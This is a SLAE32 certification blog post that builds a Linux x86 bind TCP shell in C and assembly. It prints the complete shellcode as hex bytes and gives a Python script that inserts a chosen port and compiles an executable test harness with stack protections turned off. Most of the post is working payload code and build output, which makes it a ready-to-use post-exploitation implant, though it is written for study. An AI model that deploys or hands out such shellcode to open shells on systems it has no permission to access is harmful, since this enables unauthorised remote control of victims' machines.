---
title: SLAE32 - Assignment#1 [Bind TCP Shell]
author: bigb0ss
date: 2020-12-12 13:26:00 +0800
categories: [SLAE32, Assignment_1_Bind-TCP-Shell]
tags: [slae32, assembly, x86, Bind TCP Shell]
image: /assets/img/post/slae32/slae32.png
---

<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>

<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>

<b>Student ID: SLAE-1542</b>

Github: https://github.com/bigb0sss/SLAE32/tree/master/Assignment_%231


# Assignement #1 
* Create a Shell_Bind_TCP shellcode
	- Binds to a port
	- Execs Shell on incoming connection

* Port number should be easily configurable


# What is a Bind Shell?
Bind TCP opens up a port on the victim system. If an attacker could exploit a vulnerability on the victim system, she can implant a bind shell and connect to it from the remote attaking box. However, due to a firewall and detection controls, reverse TCP shell is preferrable over bind TCP shell thesedays.

![image](/assets/img/post/slae32/assignment1/01.png)


# Socket Programming
Before creating our Bind TCP Shell in shellcode, we need to understand the Socket Programming. 

> **NOTE**: Socket programming is a way of connecting two nodes on a network to communicate with each other. 

![image](/assets/img/post/slae32/assignment1/02.png)

To better understand the Bind TCP, let's create a Bind TCP Shell in a higher programming language. We will use `C`:

```c++
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	int sockfd, acceptfd;
	int port = 9001;

	// Server Address struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET; 
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;

	// 1) Socket Creation (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// 2) Bind() Syscall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
	
	// 3) Listen() Syscall (sys_listen 4)
	listen(sockfd, 0);

	// 4) Accetpt() Syscall (sys_accept 5)
	acceptfd = accept(sockfd, NULL, NULL);

	// 5) Dup2() Syscall
	dup2(acceptfd, 0);	// stdin
	dup2(acceptfd, 1);	// stdout
	dup2(acceptfd, 2);	// stderr

	// 6) Execve() Syscall
	execve("/bin/sh", NULL, NULL);

	return 0;
}
```

Let's compile this: 

```console
gcc bind-tcp-shell.c -o bind-tcp-shell
```

The compiled binary can successfully open up a bind shell, and we can connect to it via `nc`.

![image](/assets/img/post/slae32/assignment1/03.png)


# Shellcode 

For our Bind TCP Shell shellcode, we need to use all those `syscalls`:
* 1) Socket - Initiating the socket connection
* 2) Bind - The `bind()` assigns the address specified by addr to the socket referred to by the file descriptor `sockfd`. 
* 3) Listen - Listen for the incoming connection
* 4) Accept - The  `accept()`  system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET)
* 5) Dup2 - Manages `stdin`, `stdout` and `stderr` for the file descriptor. This is necessary for input and output redirection. 
* 6) Execve - Execute a command (`/bin/sh` to spawn a shell)

## Syscall + Function Calls

First, we need to collect arguemnts for `socketcall()` as well as other `syscalls`. 

> **NOTE**: socketcall()  is  a  common  kernel  entry point for the socket system calls.

By querying `/usr/include/i386-linux-gnu/asm/unistd_32.h`, we can collect the following args for the `syscalls`:

```console
#define __NR_socketcall	102 --> Hex: 0x66
#define __NR_bind	361 --> Hex: 0x169
#define __NR_listen	363 --> Hex: 0x16b
#define __NR_accept4	364 --> Hex: 0x16c
#define __NR_dup2	63  --> Hex: 0x3f
#define __NR_execve	11  --> Hex: 0xb
```

Additionally, by looking at `/usr/include/linux/net.h`, we can also obtain args for the function calls:

```console
root@kali:~/Documents/SLAE32/Exam/Assignement1# cat /usr/include/linux/net.h | grep SYS
#define SYS_SOCKET	1		/* sys_socket(2)	*/
#define SYS_BIND	2		/* sys_bind(2)		*/
#define SYS_CONNECT	3		/* sys_connect(2)	*/
#define SYS_LISTEN	4		/* sys_listen(2)	*/
#define SYS_ACCEPT	5		/* sys_accept(2)	*/
#define SYS_GETSOCKNAME	6		/* sys_getsockname(2)	*/
#define SYS_GETPEERNAME	7		/* sys_getpeername(2)	*/
#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)	*/
#define SYS_SEND	9		/* sys_send(2)		*/
#define SYS_RECV	10		/* sys_recv(2)		*/
#define SYS_SENDTO	11		/* sys_sendto(2)	*/
#define SYS_RECVFROM	12		/* sys_recvfrom(2)	*/
#define SYS_SHUTDOWN	13		/* sys_shutdown(2)	*/
#define SYS_SETSOCKOPT	14		/* sys_setsockopt(2)	*/
#define SYS_GETSOCKOPT	15		/* sys_getsockopt(2)	*/
#define SYS_SENDMSG	16		/* sys_sendmsg(2)	*/
#define SYS_RECVMSG	17		/* sys_recvmsg(2)	*/
#define SYS_ACCEPT4	18		/* sys_accept4(2)	*/
#define SYS_RECVMMSG	19		/* sys_recvmmsg(2)	*/
#define SYS_SENDMMSG	20		/* sys_sendmmsg(2)	*/
```

## Initialization

First, let's zero out some of the registers we are going to use:

```s
global _start

section		.text

_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
```

## Socket()

Let's create the `socket()` shellcode:

```s
; 1) Socket Creation
; sockfd = socket(AF_INET, SOCK_STREAM, 0);

mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
mov bl, 0x1		; #define SYS_SOCKET 1
push edx		; int protocol = 0
push ebx		; int SOCK_STREAM = 1
push 0x2		; int AF_INET = 2
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_SOCKET
mov edi, eax		; Save the sockfd to EDI
```

## Server Address struct

Let's create the server address `struct` shellcode:

```s
; 	struct sockaddr_in addr;
;	addr.sin_family = AF_INET; 
;	addr.sin_port = htons(port);	//4444
;	addr.sin_addr.s_addr = INADDR_ANY;

push edx		; NULL Padding
push edx		; NULL Padding
push edx		; sin_addr = 0.0.0.0
push word 0x5c11		; port = 4444
push word 0x2 		; int AF_INET = 2
mov esi, esp	; Move stack pointer to ESI
```

## Bind()

Let's create the `bind()` shellcode:

```s
; 2) Bind
; bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));

mov al, 0x66		; socketcall = 102
mov bl, 0x2		; #define SYS_BIND	2
push 0x10		; sizeof(addr) = 10
push esi		; ESI = Server Address stuct
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_BIND
```


## Listen()

Let's create the `listen()` shellcode:

```s
; 3) Listen
; listen(sockfd, 0);

mov al, 0x66		; socketcall = 102
mov bl, 0x4		; #define SYS_LISTEN	4
push edx		; int backlog = 0
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_LISTEN
```


## Accept()

Let's create the `accept()` shellcode:

```s
; 4) Accept
; acceptfd = accept(sockfd, NULL, NULL);

mov al, 0x66		; socketcall = 102
mov bl, 0x5		; #define SYS_ACCEPT	5
push edx		; NULL
push edx		; NULL
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_ACCEPT
mov edi, eax
```


## Dup2()

Let's create the `dup2()` shellcode:

```s
; 5) Dup2 - Input and Output Redriection
; dup2(acceptfd, 0);	// stdin
; dup2(acceptfd, 1);	// stdout
; dup2(acceptfd, 2);	// stderr

xor ecx, ecx		; Zero out
mov cl, 0x3		; Set the counter 

loop:
xor eax, eax		; Zero out
mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
mov ebx, edi		; New sockfd
dec cl		; Decrementing the counter by 1
int 0x80		

jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag
```


## Execve()

Let's create the `execve()` shellcode:

```s
; 6) Execve
; execve("/bin/sh", NULL, NULL);

push edx		; NULL
push 0x68732f6e		; "hs/n"  <-- //bin/sh
push 0x69622f2f		; "ib//"
mov ebx, esp		; Move stack pointer to EBX
push edx		; NULL terminator
push ebx
mov ecx, esp		; Move stack pointer to ECX
mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
int 0x80		; Execute SYS_EXECVE
```


## Final Shellcode

Let's put everything togeter and test the shellcode.

```s
global _start

section		.text

_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

; 1) Socket Creation
; sockfd = socket(AF_INET, SOCK_STREAM, 0);

mov al, 0x66		; #define __NR_socketcall 102	--> Hex: 0x66
mov bl, 0x1		; #define SYS_SOCKET 1
push edx		; int protocol = 0
push ebx		; int SOCK_STREAM = 1
push 0x2		; int AF_INET = 2
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_SOCKET
mov edi, eax		; Save the sockfd to EDI

; 	struct sockaddr_in addr;
;	addr.sin_family = AF_INET; 
;	addr.sin_port = htons(port);	//4444
;	addr.sin_addr.s_addr = INADDR_ANY;

push edx		; NULL Padding
push edx		; NULL Padding
push edx		; sin_addr = 0.0.0.0
push word 0x5c11		; port = 4444
push word 0x2 		; int AF_INET = 2
mov esi, esp	; Move stack pointer to ESI

; 2) Bind
; bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));

mov al, 0x66		; socketcall = 102
mov bl, 0x2		; #define SYS_BIND	2
push 0x10		; sizeof(addr) = 10
push esi		; ESI = Server Address stuct
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_BIND

; 3) Listen
; listen(sockfd, 0);

mov al, 0x66		; socketcall = 102
mov bl, 0x4		; #define SYS_LISTEN	4
push edx		; int backlog = 0
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_LISTEN

; 4) Accept
; acceptfd = accept(sockfd, NULL, NULL);

mov al, 0x66		; socketcall = 102
mov bl, 0x5		; #define SYS_ACCEPT	5
push edx		; NULL
push edx		; NULL
push edi		; EDI = sockfd
mov ecx, esp		; Move stack pointer to ECX
int 0x80		; Execute SYS_ACCEPT
mov edi, eax

; 5) Dup2 - Input and Output Redriection
; dup2(acceptfd, 0);	// stdin
; dup2(acceptfd, 1);	// stdout
; dup2(acceptfd, 2);	// stderr

xor ecx, ecx		; Zero out
mov cl, 0x3		; Set the counter 

loop:
xor eax, eax		; Zero out
mov al, 0x3f		; #define __NR_dup2	63  --> Hex: 0x3f
mov ebx, edi		; New sockfd
dec cl		; Decrementing the counter by 1
int 0x80		

jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag

; 6) Execve
; execve("/bin/sh", NULL, NULL);

push edx		; NULL
push 0x68732f6e		; "hs/n"  <-- //bin/sh
push 0x69622f2f		; "ib//"
mov ebx, esp		; Move stack pointer to EBX
push edx		; NULL terminator
push ebx
mov ecx, esp		; Move stack pointer to ECX
mov al, 0xb		; #define __NR_execve	11  --> Hex: 0xb
int 0x80		; Execute SYS_EXECVE
```


# Compile

I created a simple compiler [compilerX86.py](https://github.com/bigb0sss/ASM_Learning/blob/master/compilerX86.py). Using this we can:
* Compile `.nasm` to a binary
* Extract shellcode from the binary to create `shellcode.c`
* Compile `shellcode.c` to a binary using `gcc`

```console
root@kali:~/Documents/SLAE32/Exam/Assignement1# python compilerX86.py -f bind-tcp-shell
 
  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
 |\   ____\|\   __  \|\   _ \  _   \|\   __  \|\  \|\  \     |\  ___ \ |\   __  \   |\  \  /  /|\   __  \|\   ____\        
 \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \  \|\  \ \  \ \  \    \ \   __/|\ \  \|\  \  \ \  \/  / | \  \|\  \ \  \___|      
  \ \  \    \ \  \\\  \ \  \\|__| \  \ \   ____\ \  \ \  \    \ \  \_|/_\ \   _  _\  \ \    / / \ \   __  \ \  \____   
   \ \  \____\ \  \\\  \ \  \    \ \  \ \  \___|\ \  \ \  \____\ \  \_|\ \ \  \\  \|  /     \/   \ \  \|\  \ \  ___  \ 
    \ \_______\ \_______\ \__\    \ \__\ \__\    \ \__\ \_______\ \_______\ \__\\ _\ /  /\   \    \ \_______\ \_______\ 
     \|_______|\|_______|\|__|     \|__|\|__|     \|__|\|_______|\|_______|\|__|\|__/__/ /\ __\    \|_______|\|_______|    
                                                                                    |__|/ \|__|     [bigb0ss] v1.0         

[+] Assemble: bind-tcp-shell.nasm
[+] Linking: bind-tcp-shell.o
[+] Shellcode: "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
[+] Creating File: shellcode.c
[+] Compiling Executable: shellcode
[+] Enjoy!
```

![image](/assets/img/post/slae32/assignment1/04.png)


# Final Touch

Lastly, I created the following python script to change the port number as the user input and automatically create and compile the `C` binary. 

```python
import sys
import argparse
import subprocess
import string
import socket

""" Arguments """
parser = argparse.ArgumentParser(description = '[+] Bind TCP Shell Generator')
parser.add_argument('-p', '--port', help='\tBind Port')
args = parser.parse_args()


def error():
    parser.print_help()
    exit(1)

def exploit(port):
    
    # Bind TCP Shell 
    shellcode = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02'
    shellcode+= '\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52\\x52\\x66\\x68'
    
    print "[INFO] Bind Port: " + port

    port = hex(socket.htons(int(port)))
    a = port[2:4]
    b = port[4:]
    if b == '':
        b = '0'
    port = '\\x{0}\\x{1}'.format(b, a)

    #port = '\\x11\\x5c' = 4444
    
    shellcode2 = '\\x66\\x6a\\x02'
    shellcode2+= '\\x89\\xe6\\xb0\\x66\\xb3\\x02\\x6a\\x10\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66'
    shellcode2+= '\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x57\\x89'
    shellcode2+= '\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe'
    shellcode2+= '\\xc9\\xcd\\x80\\x75\\xf4\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69'
    shellcode2+= '\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'

    # Adding shellcode to shellcode.c
    outShellcode = ''
    outShellcode+= '#include<stdio.h>\n'
    outShellcode+= '#include<string.h>\n'
    outShellcode+= '\n'
    outShellcode+= 'unsigned char code[] = \ \n'
    outShellcode+= '"{0}{1}{2}";'.format(shellcode, port, shellcode2)
    outShellcode+= '\n'
    outShellcode+= 'main()\n'
    outShellcode+= '{\n'
    outShellcode+= 'printf("Shellcode Length:  %d", strlen(code));\n'
    outShellcode+= '\tint (*ret)() = (int(*)())code;\n'
    outShellcode+= '\tret();\n'
    outShellcode+= '}\n'
    #print outShellcode

    # Creating shellcode.c
    filename = "exploit.c"
    outfile = open(filename, 'w')
    outfile.write(outShellcode)
    outfile.close()
    

    print "[INFO] Creating File: exploit.c"

    # Compiling shellcode.c
    subprocess.call(["gcc", "-fno-stack-protector", "-z", "execstack", filename, "-o", "exploit", "-w"])
    print "[INFO] Compiled Executable: exploit"

if __name__ == "__main__":
    inputPort = args.port if args.port != None else error()

    exploit(inputPort)
```

![image](/assets/img/post/slae32/assignment1/05.png)

